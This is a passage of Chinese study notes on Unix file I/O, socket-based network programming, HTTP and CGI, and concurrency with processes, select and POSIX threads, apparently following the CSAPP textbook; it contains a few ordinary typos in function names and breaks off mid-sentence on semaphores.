绝对路径：从根节点开始的路径； 相对路径：从当前目录开始的路径； 打开和关闭文件 进程使用 open 函数打开一个已存在的文件，或者创建一个新的文件； int open(char *filename, int flags, mode_t mode); open 函数将 filename 与一个文件描述符进行关联，并且返回代表这个文件描述符的数字； flags 参数用来指示如何访问这个文件，它可以是一位掩码，也可以是多个掩码的或，例如 open(“foo.txt”, O_WRONLY | O_APPEND, 0)； 掩码的或运算相当于多个条件的叠加； mode 参数指定了新文件的访问权限； 当使用带 mode 参数的 open 函数来创建一个新文件时，文件的访问权限会被设置为 mode &amp; ~umask；所以设置 umask 的值，对于进行权限控制是有必要的； 每个进程都有一个 umask，通过调用 umask 函数可以设置它的值，例如 #define DEF_UMASK S_IWGRP | S_IWOTH umask(DEF_UMASK) 读和写文件 通过调用 read 和 write 函数，可以对文件进行输入和输出操作； 通过调用 lseek 函数，可以显式的改变文件中的当前位置； read 返回的读取字符数量有可能比要求的少，但这并不表示错误，原因可能如下： 文件剩下的字符数没有那么多了，比如剩下20，读取50，则只能返回20； 从终端读取文本行：由于每次读一行，而一行的字节数可能没有预期的那么多； 读写网络套接字：此时由于存在内部缓冲约束和较长的网络延迟，因此会返回不足值； size_t 与 ssize_t 的区别：前者是 unsigned long，后者是有符号的 long，适用于可能返回负值的场景； 用 RIO 包健壮地读写 RIO 的全称为 robust IO；它提供两种函数 不缓冲的输入输出函数：直接在内存和文件之间传送数据，特别是适用于在网络场景中读写数据； 带缓冲的输入输出函数：用于从文件中读取文本行和二进制数据； 有些文件既有文本行也有二进制数据，例如 HTTP 响应； RIO 的目标：对标准库提供的输入输出函数二次封装，使其更加健壮； RIO 的无缓冲输入输出函数 ssize_t rio_readn(int fd, void *usrbuf, size_t n); ssize_t rio_writen(int fd, void *usrbuf, size_t n); 优点： 支持分批读取或写入； 若意外中断，可通过循环再次尝试读写，直到成功；（是否可以用来实现网络下载的断点续传？） RIO 的带缓冲的输入输出函数 rio_read 表面上来看，功能跟系统的 read 函数一样，区别在于多了一层结构(rio_t)做为缓冲进行中转，这么设计的目的在于控制每次读取的字符数量；让 readline 有机会在不用读完整行每一个字节的情况下，跳到下一行进行读取； 通过 rio_readlineb 调用 rio_read 可以实际单行只读取有限数量的字符；每行末尾增加 NULL 做为结束； 读取文件元数据 可以通过调用 stad 函数和 fstad 函数来获取文件的元数据信息 #include &lt;unistd.h&gt; #include &lt;sys&#x2F;stat.h&gt; int stad(char *filename, struct stat *buf); int fstad(int fd, struct stat *buf); 在元数据 stat 结构中，有一个 st_mode 字段用来表示文件类型， &lt;sys&#x2F;stat.h&gt; 定义了宏谓词（用法有点类似函数）来表示检查它们的值 S_ISREG，是否为普通文件 S_ISDIR，是否为目录文件； S_ISSOCK，是否为套接字文件； 读取目录内容 可以调用 readdir 函数来读取目录的内容 #include &lt;sys&#x2F;types.h&gt; #include &lt;dirent.h&gt; DIR *opendir(const char *dirname); opendir 函数打开一个目录，返回一个指向目录流的指针； 目录流是一个条目有序列表的抽象；此处为目录项的列表； struct dirent *readdir(DIR *dirp); 每次调用 readdir 都是返回指向下一个目录项的指针；若出错则返回 NULL，并设置 errno； 由于没有更多的目录项时，也是返回 NULL；因此若要检查是否出错，还需要检查 errno 是否被修改了； 目录项的结构如下 struct dirent { ino_t d_ino; &#x2F;&#x2F; 节点编号，表示文件位置？ char d_name[256]; &#x2F;&#x2F; 文件名称； } int closedir(DIR *dirp); &#x2F;&#x2F; 关闭目录流 共享文件 内核用三个相关的数据结构来表示打开的文件 描述符表：这张表是每个进程私有的；每一个描述符的表项，会指向文件表上的一个表项； 文件表：这张是所有进程共享的；每个表项包含的信息包括：当前的文件位置（即光标位置）、被引用计数（即有多少个进程指向它）、指向某条 v-node 表项的指针； 每当有一个进程，关闭某个文件时，该文件在文件表上对应的表项会减少一次引用计数；当这个引用计数减至0时，内核就会删除这个表项； v-node 表：这张表也是所有进程共享的； 每个表项包含文件stat 结构的大部分信息（目测是用来存放文件的元数据的） 在同一个进程中，允许对相同的文件打开两次，此时会出现两个文件描述符，同时文件表上面也有两个表项，因此有趣的是，两个表项可以有各自的光标位置，这意味着读写可以同时进行，互不干扰； 什么时候在不同进程之间，会共用同一个文件表的表项？估计这事应该不会发生，因为即使在同一个进程内部，对一个文件打开两次，都会生成两条文件表项，那么不同进程就不太可能会共用同一个表项了； 不过有一种情况下会共享，即父子进程，因为 fork 子进程的时候，复制了一份父进程的描述符表，导致两个进程会共享相同的文件表表项； 所以，仅在父子进程都关闭了各自的文件描述符，使得文件表项的引用计数为0时，才会触发内核删除相应的文件表项； 貌似这个时候也要特别小心，因为父子进程对同一个文件的读写存在冲突的可能？ I&#x2F;O 重定向 通过调用 dup2 函数可以实现重定向 #include &lt;unistd.h&gt; int dup2(int oldfd, int newfd); 原理：复制 oldfd 到新 newfd，覆盖 newfd 之前的内容；若 newfd 之前已经打开，则复制前会先关闭； 标准 I&#x2F;O C 语言的标准 I&#x2F;O 库将一个打开的文件模型化为一个流； 流是一个指向 FILE 数据类型的指针；它其实是对文件描述符和流缓冲区的抽象；流缓冲区的目的，和 RIO 读缓冲区的目的是一样的，即将多个单次单字节的读取，转换成每次读取一段内容到缓冲区，然后再从缓冲区读取单个字节；这样可以避免频繁调用开销较高的 Linux I&#x2F;O 系统函数； 综合：我该使用哪些 I&#x2F;O 函数，基本原则： 只要有可能就尽量使用标准库的 I&#x2F;O 函数； 不要使用 scanf 或 rio_readlineb 来读二进制文件；因为这两个函数是专门设计用来读取文本文件的；若用于二进制文件，会出现诡异的错误； 对网络套接字应该使用 RIO 函数； 原因：标准 I&#x2F;O 函数将文件抽象为流，它被设计成全双工的，即能够在同一个流上执行输入和输出，背后的原理是通过调用 Unix I&#x2F;O 的 lseek 来重置文件的光标位置；但对于网络套接字，使用 lseek 是非法的，因此导致标准 I&#x2F;O 函数在读写套接字文件时带来问题； 由于 RIO 中没有格式输入输出的 scanf 和 printf 函数，所以需要通过 sscanf 和 sprintf 配合 rio_writen 和 rio_readlineb 叠加实现即可； sprintf -&gt; rio_wirten rio_readlinb -&gt; sscanf 网络编程 客户端-服务器模型 每个网络应用都是基于此模型；在这个模型中，一个应用由一个服务器进程 + n 个客户端进程组成；服务器管理某种资源，并通过操作这些资源为客户端提供服务； 此模型中的基本操作是事务，一个事务由四步组成： 当客户端需要一个服务时，给服务器发送一个请求； 服务器收到请求后，进行解析，根据需要操作资源； 服务器给客户端发送一个响应，并等待下一次请求； 客户端收到响应并进行处理； 网络 在系统内核眼里，网络只是一种 I&#x2F;O 设备，是数据源和数据接收方，就像一个文件一样； 从网络上接收到数据，先到网络适配器（即网卡），然后通过 I&#x2F;O 总线和内存总线，复制数据到内存中；这个过程一般使用 DMA 传送（即数据不经过寄存器）； 同样，数据也以相同的方式，从内存复制到网络中； 物理上来说，网络是一个按照地理位置远近组成的层次系统，最低层是局域网（LAN，local area network）； 最流行的局域网技术是 Ethernet 以太网 一个以太网段包括一些电缆和一个集线器； 每条电缆使用相同的带宽；电缆用来连接主机的网络适配器和集线器的端口； 集线器将其收到的数据不加分辨的复制到每个端口上；因此，每台主机都可以看到每个位； 每个适配器都有一个全球唯一的48位地址（即 mac 地址），这个地址出厂时写入存储在适配器中； 一台主机可以发送一段（即一桢 frame）的位数据，到这个网段内的其他任何主机； 每个桢包含一些固定数量的头部位，用来标识此桢的源地址和目标地址，以及此桢的长度； 头部位之后就是有效载荷(payload)，即数据； 网段内的每台主机都可以看到这个桢，但只有目标地址的主机会读取它； 再使用一些电缆 + 多个网桥盒子，就可以将多个以太网段组合成一个更大的桥接以太网；（现在网桥已经被交换机取代） 网桥盒子与网桥盒子之间的带宽，可以和集线器到网桥的带宽不同； 网桥比集线器要聪明一些，它不会复制数据到所有端口，导致占用不必要的带宽；它内置了一个算法，可以根据源地址和目标地址，有选择性的复制数据给外部其他网桥（发送时），或者给内部某个集线器（接收时）；如果是以太网段内的通信，它就不复制数据，而是由集线器完成复制的工作； 继续使用一些电缆 + 多个路由器盒子（一种特殊的计算机），就可以组成更大互联网络 internet； 每个 LAN 连接到路由器的一个端口；然后路由器和路由器之间则可以使用点到点的 WAN(广域网) 连接 互联网络最大的特点是可以让不同硬件实现的局域网和广域网可以兼容通信；它通过定义一组协议，要求所有的硬件遵守这组协议来实现，协议包括两个部分： 命名机制：即统一的地址编码规则，这样可以唯一标识已经物理连接的每一台主机； 传送机制：数据打包方式，让包裹在每一站都可以被正确识别和处理；每个数据包由包头和有效载荷组成； 包头的格式（位数）是统一的，这样才能被正确识别；里面的信息包括源地址、目标地址、包大小等信息； 数据传输过程 主机 A 的客户端做系统调用，从虚拟地址空间复制数据到内核缓冲区（此步目测并不需要发生实际的物理内存数据复制）； 主机 A 的协议软件，给数据添加互联网包头和 LAN1 桢头，创建一个 LAN1 的桢，然后传送此桢数据到主机的 LAN1 适配器（网卡）； 互联网包头包含主机 B 的寻址信息； LAN1 桢头则可以寻址到路由器的 LAN1 适配器； 每一次封装，原数据都作为有效载荷，然后再加上该层封装的头部； 主机的 LAN1 适配器复制该桢到网络上； 路由器的 LAN1 适配器从电缆上读取到发过来的桢，然后传送到内置的协议软件； 协议软件去除 LAN1 头部；得到里面的有效载荷；协议软件读取到目标地址；根据该地址，以它为索引读取自己的路由表，得到下一站的地址为路由器的 LAN2 适配器； 协议软件给互联包加上 LAN2 头部做为新桢头，传送此桢到路由器的 LAN2 适配器 路由器的 LAN2 适配器复制此桢到网络上； 主机 B 的 LAN2 适配器在电缆上读取桢，将它传送到自己的协议软件； 主机 B 的协议软件去掉 LAN2 桢头和互联网包头，得到有效数据，存储在内核缓冲区； 主机 B 的服务端做系统调用，从内核缓冲区复制数据到虚拟空间； 全球 IP 因特网 因特网的客户端和服务端都混合使用套接字接口函数和 Unix I&#x2F;O 函数来进行通信； TCP&#x2F;IP 是一个协议族； IP 协议提供基本的命名方法和传送机制，但它不太可靠，传递数据包的时候，可能丢失或者重复； UDP 稍微扩展了 IP 协议，这样包可以在进程之间传送，而不是主机之间； TCP 是构建在 IP 之上的复杂协议，它提供了进程间可靠的全双工连接； IP 地址 IP 地址是一个32位无符号整数，网络程序将 IP 地址存在一个结构中（据说将这个标量数据存放在结构中，为后续带来很多麻烦，是个设计失误，暂不知为何） 不同主机有不同的字节顺序，小端法或者大端法，TCP&#x2F;IP 协议统一规定了标准的网络字节顺序（大端法）；在头文件 &lt;arpa&#x2F;inet.h&gt; 中，Unix 提供函数实现这种转换； IP 地址通常使用点分十进制来表示；在 Linux 中，可以在 shell 中使用 hostname -i 来查看本机的点分十进制 IP 地址； 在头文件 &lt;arpa&#x2F;inet.h&gt; 中，有相应的二进制 IP 地址和点分十进制转换的函数； IP 地址有很多保留段，用于某些特殊的场景，不用于公网的主机间通信，例如 192.168.. 段； 因特网域名 域名是一个层次结构，从右向左，分别是一级域名、二级域名、子域名；一级域名由 ICANN 组织进行维护；二级域名按照申请者先来后到的顺序进行分配；子域名则由申请者自己内部管理； 1988 年以前，域名与 IP 地址的映射由 HOSTS.TXT 文件进行手工维护，之后由分布在全球的数据库进行维护（DNS，domain name system） DNS 由上百万的条目组成，每个条目都是一个域名到 IP 地址的映射； Linux 有个 nslookup 函数可以用来查看某个域名对应的 IP； localhost 这个名字，为引用同一台机器上的客户端和服务端之间的通信，提供了一种便利和可移植的方式；方便调试； 因特网连接 一个套接字是连接的一个端点，每个套接字有相应的套接字地址，它由一个 IP 地址 + 一个16位端口号组成； 当客户端发起一个请求时，内核会在客户端自动分配一个临时的端口进行通信；服务端的端口则一般是固定的，有些常用的服务有约定俗成的端口编号； Linux 中的文件 &#x2F;etc&#x2F;services 里面可查询常用服务和端口的映射； 查看命令示例：cat &#x2F;etc&#x2F;services 一个连接是由它两端的套接字地址唯一确定的，称为一个套接字对 socket pair； cliaddr: cliport, servaddr: servport； 套接字接口 套接字接口是一组函数，它们和 Unix I&#x2F;O 函数结合起来，用以创建网络应用； 套接字地址结构 从内核的角度看，一个套接字就是通信的一个端点；从应用程序的角度看，一个套接字就是一个有相应文件描述符的打开的文件； 套接字地址存放在类型为 sockaddr_in 的16字节结构中； struct sockaddr_in { uint16_t sin_family; &#x2F;&#x2F; 协议族 uint16_t sin_port; &#x2F;&#x2F; 端口号 struct in_addr sin_addr; &#x2F;&#x2F; IP 地址 unsigned char sin_zero[8]; }; connect&#x2F;bind&#x2F;accept 等函数需要一个指向与协议相关的套接字地址结构的指针，因此，在没有 void* 指针的时代，通过另外定义了一个通用的地址结构(generic socket address structure) 来实现；在使用前，将 sockaddr_in 结构强制转换为 sockaddr 结构； socket 函数 此函数用来创建一个套接字描述符；对于内核来说是创建一个用于通信的端点；对于应用程序来说是创建一个用于通信的文件描述符，可向它写数据，也可以从它读数据； int socket(int domain, int type, int protocol); 参数说明 domain：地址类型 AF_INET：使用 IPv4 地址； AP_INET6：使用 IPv6 地址； AP_LOCAL type：连接类型 SOCK_STREAM，双向连接可依赖的流连接（数据如有损坏或丢失，会重新发送，即 TCP），优点是准确完整，缺点是效率慢 SOCK_DGRAM，不连续不可依赖的数据包连接，即 UDP，优点是效率快，缺点是不完整，可用于完整度要求不高的场景，例如语音\\视频聊天； （其他略） protocol：协议类型 PF_UNIX, PF_LOCAL, AF_UNIX, AF_LOCAL，进程间的通信协议； PF: protocol family，用来设置协议 AF: address family，用来初始化地址； PF_INET：IPv4 网络协议 PF_INET6：IPv6 网络协议 （其他略） socket 函数返回的文件描述符仅是部分打开的，还不能用于读写，因为还没有连接，后续还需要再做一点打开套接字的工作； connect 函数 客户端通过调用 connect 函数来建立和服务器的连接； 估计这是浏览器首次发起请求时在做的工作； int connect(int clientfd, const struct sockaddr *addr, socklen_t addrlen); connect 函数是阻塞的，一直到连接成功或者发生错误；当它成功后， 由 socket 函数创建的 clientfd 文件描述符就可以用于读写了； 貌似在浏览器里面会给它设置过期时间，即尝试一段时间仍然连接不上后，就会报错； 对于 socket 和 connect 函数，更好的办法是使用对它们进行封装的 getaddrinfo 函数； bind 函数 服务端使用 bind&#x2F;listen&#x2F;accept 函数来和客户端建立连接； int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen) bind 用来告诉内核将 addr 中的服务端套接字地址和套接字描述符联系起来； listen 函数 连接请求需要由客户端发起，服务端只能被动的等待请求； 当使用 socket 创建套接字描述符，内核默认它是客户端（即主动套接字类型），需要使用 listen 函数告诉内核，这个描述符是服务端的，从而将一个主动套接字转化为一个监听套接字； int listen(int sockfd, int backlog)； backlog 参数用来设定内核可接受的连接请求的排队数量，超过这个数量时，内核会拒绝请求，一般设为较大的值，例如 1024; accept 函数 服务端通过调用 accept 函数等待来自客户端的连接请求到达监听描述符；accept 也是阻塞的，当它成功时，会返回一个已连接描述符（新的套接字），这个已连接描述符可被 Unix I&#x2F;O 函数用来与客户端进行通信 int accept(int listenfd, struct sockaddr *addr, int *addrlen); 注意，此处的 addr 用来存放客户端的套接字地址，以便能够正确返回响应； 监听描述符是作为连接请求的一个端点，它通常只被创建一次，存在于服务端的整个生命周期； 连接描述符是针对单个客户端的单个连接端点，服务端每接收到一个客户端请求时，就创建一次；它的生命周期仅限于为某个客户端服务的连接过程中；服务结束后，它就回收了； 监听描述符和连接描述符背后其实是两个不同的套接字； 主机名和服务名的转换 getaddinfo 可将主机名、主机地址、服务名和端口号的字符串转化成套接字地址结构； int getaddrinfo(const char *host, const char *service, const struct addrinfo *hints, struct addrinfo **result); host 可以是域名，也可以是数字地址，如点分十进制的 IP 地址） service 可以是服务名（如 http)，也可以是十进制端口号； hints 是一个可选参数，它用来控制返回的 result 格式，它的结构同 result 一样，所以叫做 hints 提示，表示提示要返回的 result 结构样式； 它有8个字段，但只能设置其中四个，剩下四个需要设置为 0；因此在使用中，一般先用 memset 将整个结构清零，然后再有选择的设置部分字段的值； struct addrinfo { int ai_flags; 位掩码，通过或运算可以组合多个选项；常用的有如下几个 AI_ADDRCONFIG，当主机使用 IPv4 时，返回 IPv4 地址；使用 IPv6 时返回 IPv6 地址； AI_CANONNAME，第一个 addrinfo 结构中的 ai_canonname 默认为 NULL，若设置此标志，则指示将 ai_canonname 指向 HOST 的权威名字； AI_NUMERICSERV，强制参数 service 为端口号； AI_PASSIVE，此标志告诉 getaddrinfo 函数返回的套接字地址可能服务器用作监听套接字；此时，参数 host 应为 NULL，且得到的套接字地址结构中的地址字段会是通配符地址(wildcard address)，以便告诉内核这个服务器程序会接受发送到该主机的所有 IP 地址请求； int ai_family; &#x2F;&#x2F; 可以用来控制返回的是 IPv4 还是 IPv6 地址； int ai_socktype; 默认情况下，getaddrinfo 最多可返回与 host 关联的三个 addrinfo 数据结构（它们组成链表），每个的 socktype 不同，分别是连接、数据报、原始套接字； 如果将 ai_socktype 设置为 SOCK_STREAM，则限制 getaddrinfo 最多只返回一个 addrinfo 结构；该结构的套接字地址可以作为连接的一个端点； int ai_protocol; 余下4个略 } void freeaddrinfo(struct addrinfo *result); 其中 result 是一个链表结构，每个节点是一个包含一个指针，指向一个套接字地址结构； getnameinfo 函数 作用与 getaddrinfo 函数相反，它是将一个套接字地址转换成相应的主机和服务名字符串； int getnameinfo(const struct sockaddr *sa, socklen_t salen, char *host, size_t hostlen, char *service, size_t servlen, int flags); 套接字接口的辅助函数 open_clientfd 函数：对 getaddrinfo, socket, connect 三个函数进行了包装； open_listenfd 函数：对 getaddrinfo, socket, bind, listen 四个函数进行了包装，同时通过 setsocket 函数去除服务器的重启30秒等待的限制； 以上两个函数在 &lt;csapp.h&gt; 中，如有需要，可以从书中拷贝； htons, htonl, ntohs, ntohl，其中的 n 表示 net，h 表示 host，s 表示 short，l 表示 long，这几个函数用来实现主机和网络之间的字节顺序转换（因为网络的传输标准使用大端法，主机常为小端法，所以需要转换）； echo 客户端和服务器示例 EOF 本质上只一种触发的条件判断；在实际的数据中并没 EOF 字符； 服务器端通过无限循环等待来自客户端的连接请求；每次循环对应一个请求，请求连接成功后，调用相应的函数为客户端服务，服务完成后，关闭连接描述符； Web 服务器 Web 基础 HTTP 协议与常规的文件检索服务 FTP 的不同之外在于其可以使用 HTML 标记语言，而 HTML 中可以包含指向其他资源的指针； Web 内容 对于 Web 客户端和服务器，内容本质上是一个某种 MIME 类型的字节序列 MIME：multipurpose internet mail extensions，多用途的网际邮件扩充协议； 常见 MIME 类型包括： text&#x2F;html text&#x2F;plain application&#x2F;postscipt image&#x2F;jpeg Web 服务器以两种不同的方式向客户端提供内容 取一个磁盘文件返回给客户端：磁盘文件称为静态内容，此过程称为服务静态内容； 执行一个可执行文件，将执行结果返回给客户端；可执行文件的输出称为动态内容，此过程称为服务动态内容； 猜测现在的 WEB 框架，可能只有一个可执行文件，然后根据传入的参数，跳转到各个视图函数的位置并执行相关代码；估计此处要涉及 CGI 即通用网关接口，由于Web 服务器程序传递相关数据给 Web 程序，并由 Web 程序返回结果给 Web 服务器程序； 每条内容都是和 Web 服务器管理的某个文件关联的，这些文件有一个唯一的名字，称为 URL，统一资源定位符，uniform resource locator； 在 URL 中，使用 ? 分隔文件名和参数，使用 &amp; 分隔多个参数； &#x2F; 默认为被请求内容的主目录；所有服务器默认会把它扩展为某个默认的主页的文件名；当用户没有写 &#x2F; 时，浏览器在请求时，会自动加上； HTTP 事务 HTTP 标准要求每个文件行由回车+换行两个字符来结束； 一个 HTTP 请求的构成：一个请求行，后面跟着零个或多个的请求报头，再跟随一个空的文本行来终止报头，空行之后接请求体（如有）； 一个请求行的格式：method URI version，示例：GET &#x2F; HTTP&#x2F;1.1 最新的HTTP version 是1.1，相对于1.0 版本，增加了缓冲和安全方面的高级特性，同时还支持在一条持久连接(persistent connection)上执行多个事务； 一个 HTTP 响应的组成：一个响应行，后面跟着零个或多个的响应报头，再跟随一个空的文本行来终止报头；之后再跟随一个响应主体； 一个响应行的格式：version status-code status-message，示例：HTTP&#x2F;1.1 200 OK Content-Type 用来告知浏览器响应主体的内容的 MIME 类型； Content-Length 用来告知响应主体的字节大小； 服务动态内容 客户端如何将参数传递给服务器 GET 请求：在 URI 中传递参数，用问号 “?” 分隔文件名和参数； POST 请求：在请求主体中传递参数； 服务器如何将参数传递给子进程 服务器收到请求后，调用 fork 函数创建一个子进程 子进程将环境变量 QUERY_STRING 设置为参数字符串； 如果多个子进程都设置相同的环境变量，如何解决并发的问题？答：貌似每个进程的环境变量是独享的，因为在创建子进程时，初始化虚拟地址空间的时候，会为传入的环境变量参数在栈上分配空间；同时子进程默认会继承父进程的所有变量，在创建的过程中允许添加、修改和删除； 由于子进程会继承父进程的所有变量，并且添加自己的环境变量，因此每增加一级子进程，正常情况下环境变量会带有父级及以上进程的所有环境变量，导致环境变量越来越多； 子进程调用 execve 函数执行 &#x2F;cgi-bin&#x2F;adder 程序 adder 即为一种 CGI 程序 许多 CGI 程序使用 Perl 脚本编写脚本，因此也称为 CGI 脚本； adder 程序在运行时，使用 Linux 的 getenv 函数来读取环境变量； 示例：getenv(“QUERY_STRING”)； 对于 POST 请求，则需要从请求主体中读取参数； 由于 CGI 程序运行在子进程的上下文中，它能够访问所有在调用 execvc 函数之前就存在的打开文件和环境变量； 在创建子进程后，父进程会调用 wait 函数，该函数是阻塞的；当子进程终止的时候，会回收操作系统分配给子进程的资源； 服务器如何将其他信息传递给子进程 CGI 程序会定义大量的环境变量，一个 CGI 程序在运行时会设置这些环境变量； 常见的环境变量有 QUERTY_STRING，请求参数 SERVER_PORT，父进程监听的端口 REQUEST_METHOD，请求方法 REMOTE_HOST，客户端的域名 REMOTE_ADDR，客户端的 IP 地址（点分十进制） CONTENT_TYPE，请求体的 MIME 类型 CONTENT_LENGTH，请求体的字节大小； 子进程将它的输出发送到哪里 CGI 程序默认会将它生成的动态内容发送到标准输出；因此，子进程在加载并运行 CGI 程序前，需要使用 Linux 的 dup2 函数先将标准输出重定向到已连接描述符；这样 CGI 输出的动态内容，就会直接送达客户端； 由于父进程不知道子进程生成的内容类型和大小，因此子进程需要负责生成 CONTENT_TYPE 和 CONTENT_LENGTH 的信息作为响应报头，以及表示报头终止的空行； 综合：TINY Web 服务器 execvc 函数 int execve(const char *filename, char *const argv[ ], char *const envp[ ]) filename: 字符串，用来表示要执行的文件的路径 argv：数组，用来传递参数给执行文件； envp：数组，传递新环境变量给执行文件 例如可以使用全局变量 environ（包含在头文件 &lt;unistd.h&gt; 中） 并发编程 概述 如果逻辑控制流在时间上是重叠的，那么它们就是并发的； Linux 信号处理程序可以用来响应异步事件； 应用级并发场景 访问慢速的 I&#x2F;O 设备 人机交互：每个用户请求某种操作，一个独立的并发逻辑流被创建来执行这个操作； 通过推迟操作以降低延迟：将多个操作推迟以合并为一个，例如动态内存分配器的合并操作； 服务多个网络客户端； 在多核处理器上进行并行计算； 三种基本的构建并发程序的方法 进程：每个逻辑控制流都是一个独立的进程，由内核来调度和维护；由于每个进程有独立的虚拟地址空间，因此控制流之间的通信需要使用某种显式的进程间通信机制(IPC)； 各种 IPC 进程间通信的方法 管道 pipe 特点：只能单向传输数据，它是一种特殊类型的文件，A 进程向里面写入数据，B 进程从里面读取数据；当管道中没有数据时，B 进程会阻塞，直到读到数据后才会返回；若想实现双向传输，可以通过建立两条管道； 管道的实现是建立一块内存缓冲区，A&#x2F;B 进程从缓冲区中读写数据； 管道只允许父子进程之间使用，因为它没有名字，其他进程找不到它； 只允许发送无格式字符流； 命名管道 named pipe 改进点：允许没有亲缘关系的进程进行通信； 缺点：需要在进程间同步名字，同时貌似存在同步和阻塞的问题； 信号 signal 有点像是系统发出的广播 数据承载力很差，只承载一定长度内的数据； 消息队列 message queue 它实际上是内核缓冲区中的一个命名的链表结构，而且是由于是链表，可承载内容是柔性的，因此可以承载较多数据（最大是 8192 字节）； 与命名管道的异同 相同点：允许没有亲缘关系的进程进行通信； 不同点 消息队伍可以独立于进程而单独存在，因此不需要在进程间同步管道的名字； 可以避免命名管道存在的同步和阻塞问题，不需要由进程自己来提供同步的方法； 接收消息的进程可以基于消息类型有选择的接收数据，不像管道得接收全部数据； 共享内存 原理：每个进程将自己虚拟地址映射的物理地址共享给其他进程进行映射，这样该物理内存的变动，都可以被所有进程共享读取； 优点：性能比命名管道和消息队列好一点，因为它不涉及写，或者最多写一次，其他两种都需要涉及至少一次写（最多两次）以及数据结构转换； 缺点：本身没有同步机制，需要进程自己控制； 套接字 原理：通过建立客户端和服务端的抽象，让不同进程之间实现相互访问； 优点：可以实现跨机器之间的通信； 缺点：性能比较差一些； I&#x2F;O 多路复用：应用程序在一个进程的上下文中显式的调度它们自己的逻辑流；逻辑流被模型化为状态机；数据到达文件描述符后，主程序显式地从一个状态转换到另一个状态； 线程：线程是运行在单一进程上下文中的某一个顺序逻辑流，由内核进行调度；它有点像前面两种的混合体，像进程一样由内核进行调度，又像 I&#x2F;O 多路复用一样共享一个虚拟地址空间； 因为线程是由内核调度的，顺序不可控，因此也引入了同步的难题；同时线程切换也需要一点点时间，导致性能没有 I&#x2F;O 多路复用好； 基于进程的并发编程 原理：为每个客户端请求创建一个子进程来为客户端提供服务； 优缺点 优点：每个进程拥有独立的地址空间，不同进程不会覆盖彼此的数据； 缺点：进程间共享状态或数据比较麻烦，所以性能较差，因为进程控制和 IPC 的开销比较高； 基于 I&#x2F;O 多路复用的并发编程：I&#x2F;O multiplexing 原理：使用 select 函数，要求内核挂起进程，只有在一个或多个 I&#x2F;O 事件发生后，才将控制返回给应用程序（通过调用 select 函数实现） 创建一个描述符的位集合（fdset)，以及它的一个子集叫做“准备好集合”(ready set，初始每个位都为0）；select 函数以 fdset 和 ready set 为参数 select 的执行是阻塞的，它会一直等到 fdset 中有一个位所表示的描述符准备好时，才会写入结果到 ready set 并返回 当 select 返回后，我们就可以调用宏来判断 ready set 具体是哪个位所代表的描述符准备好了，然后调用不同的函数进行处理； 事件驱动原理 将逻辑流模型化为状态机； 一个状态机由一组状态、输入事件和转移组成； 转移是指根据：输入状态 + 输入事件 &#x3D;&gt; 输出新的状态； 如果输出的新的状态跟输入状态一样，则称为自循环； 事件驱动服务器 对于每个客户端，服务器为其生成一个状态机，并将该状态机和已连接描述符关联起来； 每个状态机都有 一个状态：等待描述符准备好，以便可以读； 一个输入事件：描述符准备好了； 一个转移：从描述符读取一个文本行； 感觉转移有点像是动作；当某种事件发生的时候，就去做某种动作； 服务器 I&#x2F;O 多路复用，借助 select 函数检测输入事件的发生，当某个已连接描述符准备好了后，服务器就为相应的状态机执行转移（从描述符中读取内容，并对内容进行处理）； 优缺点 优点 I&#x2F;O 多路复用是编写并发事件驱动程序的基础，它使得基于事件驱动的服务器变得容易实现； 每个逻辑流共享单一进程中的虚拟地址空间，因此共享数据很容易； 性能比较好，因为省去了进程或线程切换的开销； 缺点 编码复杂，需要比基于进程并发的程序，多写很多代码；随着并发粒度的减小，复杂度还会上升； 若某个恶意的客户端故意只发送部分文本行，之后中止，则服务器会处于等待，导致服务停止；（是否可以通过设置最大等待时间来解决这个问题？） 不能充分利用多核处理器；（或许此时可以开启多个进程来规避这个缺点？即有多少核心就相应开启多少个进程，这样每个核可以负责一个进程） 基于线程的并发编程 线程：一条线程是指运行在进程上下文中的某一个顺序的逻辑流；线程由内核自动调度；每个线程都有自己的线程上下文，包括唯一的整数线程ID、栈、栈指针、程序计数器、通用目的寄存器和条件码等； 所有运行在同一个进程里的多个线程共享进程的虚拟地址空间； 线程执行模型 跟进程有点类似，每个进程在开始生命周期时都是单一线程（主线程），在某一时刻，主线程创建了一个对等线程； 当主线程执行一个慢速系统调用时，控制权就会转移到对等线程，直到对等线程出现慢速调用，然后转回控制权； 这样可以实现对 CPU 的充分利用，避免 CPU 处于等待； 线程的上下文要比进程小得多，因此它的切换会比进程快得多； 线程之间不是父子关系，而是平等的关系，这也意味着一个线程可以杀死它的任何对等线程，或是等待它的任意对等线程终止；每个对等线程共享相同的数据； POSIX 线程 Posix 线程是在 C 程序中处理线程的一个标准接口，在头文件&lt;pthread.h&gt; 中（貌似链接时需要使用动态库？）； 通过 posix 标准接口，可以实现线程的创建和销毁； 它的创建感觉跟创建子进程有点小类似； 终止线程的方法 当顶层的线程例程返回时，线程会隐式的终止； 通过调用 pthread_exit 函数，终止当前线程 如果是主线程调用这个函数，则它会等待所有其他对等线程终止后，再终止自己和整个进程； 通过调用 pthread_cancel 函数，传递线程 ID 作为参数，它会终止该 ID 代表的线程； 当某个线程中调用 exit 函数时，会终止整个进程和所有线程； int pthread_join(pthread_t thread, void **retval); 以阻塞的方式等待指定的线程结束；当函数返回时，线程的资源被收回； 多线程程序中的共享变量 对于不同线程来说，它们有独立的栈、程序计数器、通用寄存器和条件码，进程上下文的剩下部分则是共享的，包括整个虚拟地址空间，即只读的代码节、数据区域（如全局变量、静态变量等）、堆、动态库、打开文件集合等；但一个线程无法访问另外一个线程的寄存器值；即寄存器不共享，但虚拟内存是共享的； 通常每个线程只访问自己的栈，但如果它能够拿到其他线程的栈指针，那它就能够实现访问； 用信号量同步线程 线程的优点是线程间共享变量十分方便，只需要传递指针就可以了，或者使用全局变量或静态变量，缺点是有可能引发同步错误，因此它需要引入信号量机制来控制访问顺序； 进度图：将 n 个并发线程的执行模型化为一条 n 维笛卡尔空间中的轨迹线； 信号量：具有非负整数值的全局变量，只有两种特殊的操作来处理 P 操作：用来检测信号； 如果 s 非零，则 P 将 s 减 1，并且立即返回；（如果信号灯是绿色，通过斑马线，将电量减 1，结束操作） 如果 s 为零，则挂起这个线程，直到 s 变为非零；（如果信号灯是红色，进入等待） V 操作：用来释放信号 它会将 s 加 1（将信号灯电量加1，让其变成绿灯） 如果有任何线程的 P 操作在等待，则 V 还会重启其中任意一个线程，以便这些线程继续完成它们挂起的 P 操作；（如果之前有人在等待红灯，在 V 把灯变成绿灯后，任意选择其中一个人进行通知）； 信号量具备一个属性，即 s 永远不可能为 